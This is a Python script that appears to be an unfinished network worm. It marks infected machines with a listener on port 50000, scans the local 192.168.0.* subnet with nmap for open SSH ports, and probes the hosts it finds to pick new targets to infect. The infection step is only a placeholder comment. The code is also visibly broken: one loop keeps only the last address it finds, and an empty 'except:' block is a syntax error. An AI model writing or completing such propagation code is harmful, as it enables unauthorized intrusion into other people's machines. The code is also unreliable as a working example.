#! /usr/bin/env python3
"""
"""
	
from threading import Thread
import socket

class SocketListener(Thread):

	def __init__(self):
		Thread.__init__(self)
		
	def run(self):
		#create an INET, STREAMing socket
		serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#bind the socket to a public host and a port
		serverSocket.bind((socket.gethostname(), 50000))
		#become a server socket, 5 is the number of maximum connections that we can have at the same time
		serverSocket.listen(5)
		
		while True:
			#we just received a new connection. This line will block until we receive a new connection.
			conn, addr = serverSocket.accept()
			
			#we already infected the computer. Sending OK to the computer that made the connection to let him know that we infected the computer, so that he won't try to infect us
			conn.sendall('OK'.encode('utf-8'))
			conn.close()

#Step one: Open a socket, to let other computers know that this computer is infected.
socketThread = SocketListener()
socketThread.start()

#Step two: Scan the network for other computers to infect
import subprocess

print([(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
#HARDCODED - through ifconfig, need to figure out local adress/mask
nmapOutput = subprocess.check_output(["nmap", "-p", "22", "-oG", "-", "192.168.0.*"])
nmapOutput = nmapOutput.decode("utf-8")
listedNmapString = list(filter(lambda x: "open" in x, nmapOutput.splitlines()))

for entry in listedNmapString:
    ip = entry.split()[1]
	
host = ip
dataDecoded = None
errorOccured = False

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketClient:
		socketClient.connect((host, 50000))
		socketClient.sendall('I'.encode('utf-8'))
		data = socketClient.recv(1024)
		dataDecoded = data.decode('utf-8')
except:
	errorOccured = True

if not errorOccured:
	if dataDecoded != 'OK':
		print('ErrorOccured = false, dataDecoded =/= OK')
		print('Found a possible computer to infect. Trying to infect the machine...')
		#Try to infect machine here
	else:
		print('ErreurOccured = false, dataDecoded = OK')
		print('Machine already infected. Passing to the next one...')
else:
	print('ErrorOccured = true')
	print('Unknown error occured. Retrying later...')

try:
	onSenCaliss = input('Appuyez sur nimporte quel touche pour Quitter (DEBUGGING PURPOSES, A ENLEVER)')
except:
finally:
	exit()
